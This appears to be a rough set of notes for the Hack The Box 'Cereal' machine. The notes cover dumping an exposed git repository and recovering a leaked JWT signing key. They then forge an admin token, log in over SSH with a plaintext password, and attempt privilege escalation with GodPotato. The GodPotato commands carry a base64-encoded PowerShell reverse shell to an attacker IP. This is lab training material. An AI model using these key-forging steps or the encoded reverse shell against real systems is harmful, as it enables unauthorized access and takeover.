[-] Fetching https://source.cereal.htb/.git/objects/79/8491e48549834a78529585284c2666ab2fdcba [200]
[-] Fetching https://source.cereal.htb/.git/objects/c2/c86b859eaa20639adf92ff979c2be8d580433e [200]
[-] Fetching https://source.cereal.htb/.git/objects/06/555ebac5382b6c8cf81462ed82f0e9a6135322 [200]
[-] Fetching https://source.cereal.htb/.git/objects/fa/313abf53936aefc517dbd583b724a57199d415 [200]
[-] Fetching https://source.cereal.htb/.git/objects/a4/41747887f06f30aef96d1ad221ac41b8bd9568 [200]
[-] Fetching https://source.cereal.htb/.git/objects/bd/5d4b5e235ab9d880c202a6a7f7d3e35e115d8c [200]
[-] Fetching https://source.cereal.htb/.git/objects/0f/901662f5a6015dd0e9dbc7985aa32f62a5ed61 [200]
[-] Fetching https://source.cereal.htb/.git/objects/7b/25690d44c73355f918bcdeaf90310df8fd9019 [200]
[-] Fetching https://source.cereal.htb/.git/objects/09/f3769bb78c3987f77a209602df7425556f7cd6 [200]
[-] Running git checkout .

```

```
┌──(root㉿kali)-[~/Desktop]
└─# git log
commit 34b68232714f841a274050591ff5595dcf7f85da (HEAD -> master)
Author: Sonny <sonny@cere.al>
Date:   Tue Jan 7 17:19:04 2020 -0600

    Some changes

commit 3a23ffe921530036a4e0c355e6c8d1d4029cb728
Author: Sonny <sonny@cere.al>
Date:   Thu Nov 14 21:45:55 2019 -0600

    Image updates

commit 7bd9533a2e01ec11dfa928bd491fe516477ed291
Author: Sonny <sonny@cere.al>
Date:   Thu Nov 14 21:40:06 2019 -0600

    Security fixes

commit 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
Author: Count Chocula <chocula@cere.al>
Date:   Thu Nov 14 21:37:50 2019 -0600

    CEREAL!!

```

```
┌──(root㉿kali)-[~/Desktop/htb/cereal]
└─# git show 7bd9
commit 7bd9533a2e01ec11dfa928bd491fe516477ed291
Author: Sonny <sonny@cere.al>
Date:   Thu Nov 14 21:40:06 2019 -0600

    Security fixes

diff --git a/Controllers/RequestsController.cs b/Controllers/RequestsController.cs
index 276631a..1b1e183 100644
--- a/Controllers/RequestsController.cs
+++ b/Controllers/RequestsController.cs
@@ -37,6 +37,11 @@ namespace Cereal.Controllers
             using (var db = new CerealContext())
             {
                 string json = db.Requests.Where(x => x.RequestId == id).SingleOrDefault().JSON;
+                // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
+                if (json.ToLower().Contains("objectdataprovider") || json.ToLower().Contains("windowsidentity") || json.ToLower().Contains("system"))
+                {
+                    return BadRequest(new { message = "The cereal police have been dispatched." });
+                }
                 var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
                 {
                     TypeNameHandling = TypeNameHandling.Auto
diff --git a/Services/UserService.cs b/Services/UserService.cs
index 60f1b74..6e62360 100644
--- a/Services/UserService.cs
+++ b/Services/UserService.cs
@@ -30,7 +30,7 @@ namespace Cereal.Services
 
                 // authentication successful so generate jwt token
                 var tokenHandler = new JwtSecurityTokenHandler();
-                var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
+                var key = Encoding.ASCII.GetBytes("****");
                 var tokenDescriptor = new SecurityTokenDescriptor
                 {
                     Subject = new ClaimsIdentity(new Claim[]
diff --git a/Startup.cs b/Startup.cs
index 9f2579c..053a5e8 100644
--- a/Startup.cs
+++ b/Startup.cs
@@ -50,7 +50,7 @@ namespace Cereal

```

Running `git show 7bd9` will show the changes in the commit titled “Security fixes”. Sure enough, the key is removed:\
secretlhfIH\&FY\*#oysuflkhskjfhefesf

```
┌──(root㉿kali)-[~/Desktop]
└─# cd .git         
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/.git]
└─# ls
COMMIT_EDITMSG  config  description  HEAD  index  info  logs  objects  refs
                                                                                
```

If I run `git status`, it will show a ton of files as deleted. That’s because Git is tracking all these files, but they aren’t on my file system, which implies they’ve been deleted since the last commit. `git reset --hard` will go back to where it was at the last commit, restoring all the files:

```
┌──(root㉿kali)-[~/Desktop/.git]
└─# git reset --hard
fatal: this operation must be run in a work tree
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/.git]
└─# cd ..           
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# git reset --hard
HEAD is now at 34b6823 Some changes
                                           
```

```
┌──(root㉿kali)-[~/Desktop/htb/cereal]
└─# ls
ApplicationOptions.cs         appsettings.json  Cereal.csproj  Controllers        ExtensionMethods.cs  IPRequirement.cs  Models  Program.cs  Services
appsettings.Development.json  CerealContext.cs  ClientApp      DownloadHelper.cs  IPAddressHandler.cs  Migrations        Pages   Properties  Startup.cs

```

### Initial Source Analysis

```
┌──(root㉿kali)-[~/Desktop/htb/cereal]
└─# tree -f .                                      
.
├── ./ApplicationOptions.cs
├── ./appsettings.Development.json
├── ./appsettings.json
├── ./CerealContext.cs
├── ./Cereal.csproj
├── ./ClientApp
│   ├── ./ClientApp/package.json
│   ├── ./ClientApp/package-lock.json
│   ├── ./ClientApp/public
│   │   ├── ./ClientApp/public/favicon.ico
│   │   ├── ./ClientApp/public/FuturaStd-Bold.woff
│   │   ├── ./ClientApp/public/index.html
│   │   ├── ./ClientApp/public/logo192.png
│   │   ├── ./ClientApp/public/logo512.png
│   │   ├── ./ClientApp/public/manifest.json
│   │   └── ./ClientApp/public/robots.txt
│   ├── ./ClientApp/README.md
│   └── ./ClientApp/src
│       ├── ./ClientApp/src/AdminPage
│       │   ├── ./ClientApp/src/AdminPage/AdminPage.jsx
│       │   └── ./ClientApp/src/AdminPage/index.js
│       ├── ./ClientApp/src/App
│       │   ├── ./ClientApp/src/App/App.css
│       │   ├── ./ClientApp/src/App/App.jsx
│       │   └── ./ClientApp/src/App/index.js
│       ├── ./ClientApp/src/_components
│       │   ├── ./ClientApp/src/_components/index.js
│       │   └── ./ClientApp/src/_components/PrivateRoute.jsx
│       ├── ./ClientApp/src/_helpers
│       │   ├── ./ClientApp/src/_helpers/auth-header.js
│       │   ├── ./ClientApp/src/_helpers/handle-response.js
│       │   ├── ./ClientApp/src/_helpers/history.js
│       │   └── ./ClientApp/src/_helpers/index.js
│       ├── ./ClientApp/src/HomePage
│       │   ├── ./ClientApp/src/HomePage/HomePage.jsx
│       │   └── ./ClientApp/src/HomePage/index.js
│       ├── ./ClientApp/src/index.jsx
│       ├── ./ClientApp/src/LoginPage
│       │   ├── ./ClientApp/src/LoginPage/index.js
│       │   └── ./ClientApp/src/LoginPage/LoginPage.jsx
│       └── ./ClientApp/src/_services
│           ├── ./ClientApp/src/_services/authentication.service.js
│           ├── ./ClientApp/src/_services/index.js
│           └── ./ClientApp/src/_services/request.service.js
├── ./Controllers
│   ├── ./Controllers/RequestsController.cs
│   └── ./Controllers/UsersController.cs
├── ./DownloadHelper.cs
├── ./ExtensionMethods.cs
├── ./IPAddressHandler.cs
├── ./IPRequirement.cs
├── ./Migrations
│   ├── ./Migrations/20191105055735_InitialCreate.cs
│   ├── ./Migrations/20191105055735_InitialCreate.Designer.cs
│   └── ./Migrations/CerealContextModelSnapshot.cs
├── ./Models
│   ├── ./Models/AuthenticateModel.cs
│   ├── ./Models/CerealModel.cs
│   ├── ./Models/Request.cs
│   └── ./Models/User.cs
├── ./Pages
│   ├── ./Pages/Error.cshtml
│   ├── ./Pages/Error.cshtml.cs
│   └── ./Pages/_ViewImports.cshtml
├── ./Program.cs
├── ./Properties
│   └── ./Properties/launchSettings.json
├── ./Services
│   └── ./Services/UserService.cs
└── ./Startup.cs

17 directories, 54 files

```

that should be https://10.129.35.230/login

![Pasted image 20260520140547.png](/ob/Pasted%20image%2020260520140547.png)

use the vscode to open

![Pasted image 20260520140904.png](/ob/Pasted%20image%2020260520140904.png)

### JWT Structure

```
namespace Cereal.Services
{
    public interface IUserService
    {
        User Authenticate(string username, string password);
    }

    public class UserService : IUserService
    {
         public User Authenticate(string username, string password)
        {
            using (var db = new CerealContext())
            {
                var user = db.Users.Where(x => x.Username == username && x.Password == password).SingleOrDefault();

                // return null if user not found
                if (user == null)
                    return null;

                // authentication successful so generate jwt token
                var tokenHandler = new JwtSecurityTokenHandler();
                var key = Encoding.ASCII.GetBytes("****");
                var tokenDescriptor = new SecurityTokenDescriptor
                {
                    Subject = new ClaimsIdentity(new Claim[]
                    {
                        new Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(7),
                    SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                var token = tokenHandler.CreateToken(tokenDescriptor);
                user.Token = tokenHandler.WriteToken(token);

                return user.WithoutPassword();
            }
        }
    }
}
```

It looks up the user by username and password, and returns `null` if none are found. Otherwise, it generates a JWT using the `UserId` as the `Name`, the expiration in seven days, and the HmacSha256 algorithm with the key that’s all stars above but that hopefully I leaked from the previous commits.

### Mock Code

The next step would be reading docs and blog posts to figure out exactly what the JWT will look like. There’s Microsoft docs [like this](https://docs.microsoft.com/en-us/azure/architecture/multitenant-identity/claims) that show different claims. And a post like [this](https://blog.pedrofelix.org/2012/11/27/json-web-tokens-and-the-new-jwtsecuritytokenhandler-class/) shows that the expiration needs to be the `exp` parameter (and it will throw an error if that’s not in the token). Or, I could just use similar code to generate a JWT and see what it looks like. I’ll take the code above, and paste it into a new C# project I named `CerealJWT` in Visual Studio:

### Rebuild

What to Download (Prerequisites)

**The .NET SDK:** Download the **.NET 8.0 SDK** (or newer) from the official Microsoft website. This includes the compiler and tools you need to build the app.

**A Code Editor:** Download **Visual Studio 2022** (Community edition is free and easiest for beginners) OR **Visual Studio Code** (with the C# Dev Kit extension).

https://dotnetfiddle.net/

![Pasted image 20260528111413.png](/ob/Pasted%20image%2020260528111413.png)

```
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

// ---------------------------------------------------
// 1. MOCK MODELS & HELPERS
// ---------------------------------------------------
namespace Cereal.Models
{
    public class User
    {
        public int UserId { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string Token { get; set; }
    }
}

namespace Cereal.Helpers
{
    public static class ExtensionMethods
    {
        public static Cereal.Models.User WithoutPassword(this Cereal.Models.User user)
        {
            if (user == null) return null;
            user.Password = null;
            return user;
        }
    }
}

// ---------------------------------------------------
// 2. YOUR SERVICE & MOCK DATABASE
// ---------------------------------------------------
namespace Cereal.Services
{
    public class CerealContext : IDisposable
    {
        public IQueryable<Cereal.Models.User> Users { get; set; }
        
        public CerealContext()
        {
            Users = new List<Cereal.Models.User>
            {
                new Cereal.Models.User { UserId = 1, Username = "admin", Password = "password123" }
            }.AsQueryable();
        }
        
        public void Dispose() { } 
    }

    public interface IUserService
    {
        Cereal.Models.User Authenticate(string username, string password);
    }

    public class UserService : IUserService
    {
        public Cereal.Models.User Authenticate(string username, string password)
        {
            using (var db = new CerealContext())
            {
                var user = db.Users.Where(x => x.Username == username && x.Password == password).SingleOrDefault();

                if (user == null)
                    return null;

                var tokenHandler = new JwtSecurityTokenHandler();
                var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf"); 
                
                var tokenDescriptor = new SecurityTokenDescriptor
                {
                    Subject = new ClaimsIdentity(new Claim[]
                    {
                        new Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(7),
                    SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                
                var token = tokenHandler.CreateToken(tokenDescriptor);
                
                // --- YOUR REQUESTED CHANGE ---
                Console.WriteLine("\n[Internal Service Log] Token generated: \n" + tokenHandler.WriteToken(token));

                return Cereal.Helpers.ExtensionMethods.WithoutPassword(user);
            }
        }
    }
}

// ---------------------------------------------------
// 3. MAIN EXECUTION
// ---------------------------------------------------
public class Program
{
    public static void Main()
    {
        var userService = new Cereal.Services.UserService();

        Console.WriteLine("Attempting to authenticate 'admin'...");
        
        var user = userService.Authenticate("admin", "password123");

        if (user != null)
        {
            Console.WriteLine("\n--- LOGIN SUCCESSFUL ---");
            Console.WriteLine("User ID: " + user.UserId);
            Console.WriteLine("Username: " + user.Username);
            Console.WriteLine("Password Field: " + (user.Password == null ? "[Successfully Cleared]" : user.Password));
            // Note: I removed the line printing user.Token here, because it is now null!
        }
        else
        {
            Console.WriteLine("\n--- LOGIN FAILED ---");
            Console.WriteLine("Invalid username or password.");
        }
    }
}
```

```
Attempting to authenticate 'admin'...

[Internal Service Log] Token generated: 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE3Nzk5Mzk4MzUsImV4cCI6MTc4MDU0NDYzNSwiaWF0IjoxNzc5OTM5ODM1fQ.SqkT5qMb2yLS0BK34DYhc9cRJm7rkk_CFCZ5dFDadfQ

--- LOGIN SUCCESSFUL ---
User ID: 1
Username: admin
Password Field: [Successfully Cleared]****
```

![Pasted image 20260528114442.png](/ob/Pasted%20image%2020260528114442.png)

Putting all of that together, I’ll create a JWT using Python:

![Pasted image 20260528114602.png](/ob/Pasted%20image%2020260528114602.png)

```
(Python) ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Cereal]
└──╼ $uv pip install PyJWT
Using Python 3.13.5 environment at: Python
Resolved 1 package in 364ms
Prepared 1 package in 64ms
Installed 1 package in 36ms
 + pyjwt==2.13.0

```

```
#!/usr/bin/env python3          
          
import jwt
from datetime import datetime, timedelta


print(jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
```

```
(Python) ┌─[tester@parrot]─[~/Desktop/HTB/Cereal]
└──╼ $python3 script.py 
/home/tester/Desktop/HTB/Cereal/script.py:7: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  print(jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTc4MDU0NDg4Nn0.FiogoAyNrnyaPOLq88lJjqHw_oxRwE0phkGDkKA4d-c

```

```
POST /requests HTTP/2

Host: 10.129.5.17

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://10.10.10.217/

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTc4MDU0NDg4Nn0.FiogoAyNrnyaPOLq88lJjqHw_oxRwE0phkGDkKA4d-c

Content-Type: application/json

Origin: https://10.10.10.217

Content-Length: 2

Dnt: 1


```

![Pasted image 20260528131524.png](/ob/Pasted%20image%2020260528131524.png)

```
POST /requests HTTP/2

Host: 10.129.5.17

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://10.10.10.217/

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTc4MDU0NDg4Nn0.FiogoAyNrnyaPOLq88lJjqHw_oxRwE0phkGDkKA4d-c

Content-Type: application/json

Origin: https://10.10.10.217

Content-Length: 116

Dnt: 1



{"json":"{\"title\":\"Test-Title\",\"flavor\":\"bacon\",\"color\":\"#FFF\",\"description\":\"Test Description\"}"}
```

![Pasted image 20260528131627.png](/ob/Pasted%20image%2020260528131627.png)

```
(Python) ┌─[tester@parrot]─[~/Desktop/HTB/Cereal]
└──╼ $sshpass -p 'mutual.madden.manner38974' ssh -o StrictHostKeyChecking=no sonny@10.129.5.17

```

```
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny>

```

***

**Vertical Split (Left & Right):** Press `Ctrl + b` then `%`.

.\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAwADAAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

.\GodPotato-NET35.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAwADAAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

* **Zoom In (Maximize):** Press `Ctrl + b` then `z`.
* **Zoom Out (Minimize):** Press `Ctrl + b` then `z` again to return to the split layout.

```
sonny@CEREAL C:\ProgramData>Get-Service -Name Spooler 
'Get-Service' is not recognized as an internal or external command, 
operable program or batch file.


```

SweetPotato and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) get Windows to connect to them using a print job via the Print Spooler service. The problem for Cereal is that the OS is actually Windows Server Core:

```
PS C:\> gci 'hklm:\software\microsoft\windows nt\currentversion\server'

    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\server

Name                           Property
----                           --------
ServerLevels                   ServerCore : 1
```

Looking at the `netstat` on Cereal, there are several services listening that I didn’t see in the original `nmap`:

```
sonny@CEREAL C:\Users\sonny>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1788
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4    
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4    
  TCP    0.0.0.0:8172           0.0.0.0:0              LISTENING       4    
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4    
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       460  
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       740  
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1152 
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       604  
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       624  
  TCP    10.129.5.17:22         10.10.16.100:56256     ESTABLISHED     1788 
  TCP    10.129.5.17:139        0.0.0.0:0              LISTENING       4    
  TCP    127.0.0.1:443          127.0.0.1:50132        ESTABLISHED     4    
  TCP    127.0.0.1:49668        0.0.0.0:0              LISTENING       3604 
  TCP    127.0.0.1:49673        0.0.0.0:0              LISTENING       3700
  TCP    127.0.0.1:49673        127.0.0.1:49676        ESTABLISHED     3700
  TCP    127.0.0.1:49673        127.0.0.1:49677        ESTABLISHED     3700
  TCP    127.0.0.1:49673        127.0.0.1:49679        ESTABLISHED     3700
  TCP    127.0.0.1:49676        127.0.0.1:49673        ESTABLISHED     3604
  TCP    127.0.0.1:49677        127.0.0.1:49673        ESTABLISHED     3604
  TCP    127.0.0.1:49679        127.0.0.1:49673        ESTABLISHED     3604
  TCP    127.0.0.1:50132        127.0.0.1:443          ESTABLISHED     3948
  TCP    [::]:22                [::]:0                 LISTENING       1788
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       848
  TCP    [::]:443               [::]:0                 LISTENING       4
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       4
  TCP    [::]:8172              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       460
  TCP    [::]:49665             [::]:0                 LISTENING       740
  TCP    [::]:49666             [::]:0                 LISTENING       1152
  TCP    [::]:49667             [::]:0                 LISTENING       604
  TCP    [::]:49672             [::]:0                 LISTENING       624
  TCP    [::1]:49668            [::]:0                 LISTENING       3604
  TCP    [::1]:50129            [::1]:49668            TIME_WAIT       0
  TCP    [::1]:50130            [::1]:49668            TIME_WAIT       0
  TCP    [::1]:50131            [::1]:49668            TIME_WAIT       0
  TCP    [::1]:50133            [::1]:49668            TIME_WAIT       0
  UDP    0.0.0.0:123            *:*                                    1820
  UDP    0.0.0.0:5353           *:*                                    3700
  UDP    0.0.0.0:5353           *:*                                    3700
  UDP    10.129.5.17:137        *:*                                    4
  UDP    10.129.5.17:138        *:*                                    4
  UDP    127.0.0.1:49664        *:*                                    2364
  UDP    [::]:123               *:*                                    1820
  UDP    [::]:5353              *:*                                    3700

```

8080 is interesting, as it looks like a potential webserver. I’ll disconnect the SSH session, and reconnect with a `-L 8888:127.0.0.1:8080` to listen on my localhost TCP 8888, and forward traffic through SSH to 8080 on Cereal. Then visiting `http://127.0.0.1:8888` loads page:

```
(Python) ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Cereal]
└──╼ $sshpass -p 'mutual.madden.manner38974' ssh -o StrictHostKeyChecking=no sonny@10.129.5.17 -N -L 8080:localhost:8080


```

github.com/micahvandeusen/GenericPotato

I’ll open a Windows VM and download the GenericPotato zip from Github. After unzipping, I’ll double-click the `.sln` file:

I’ll set the context to Release, and since there’s no x64 option, just leave it as Any CPU.

![Pasted image 20260528135711.png](/ob/Pasted%20image%2020260528135711.png)

https://0xdf.gitlab.io/2021/05/04/networking-vms-for-htb.html

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Cereal]
└──╼ $sudo iptables -t nat -A POSTROUTING -s 192.168.154.0/24 -o tun0 -j MASQUERADE
[sudo] password for tester: 

```

![Pasted image 20260528141945.png](/ob/Pasted%20image%2020260528141945.png)

![Pasted image 20260528142011.png](/ob/Pasted%20image%2020260528142011.png)

![Pasted image 20260528142029.png](/ob/Pasted%20image%2020260528142029.png)

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $sudo nmcli con add type ethernet ifname ens36 con-name htb-bridge \
  ipv4.addresses 192.168.154.10/24 \
  ipv4.method manual \
  connection.autoconnect yes
[sudo] password for tester: 
Connection 'htb-bridge' (39ea85c3-d2fd-42f9-9124-221e9f133e7a) successfully added.
┌─[tester@parrot]─[~/Desktop]
└──╼ $

```

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $# Persistent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1

```

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $sudo iptables -t nat -A POSTROUTING -s 192.168.154.0/24 -o tun0 -j MASQUERA
```

```
sudo apt install iptables-persistent -y
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```
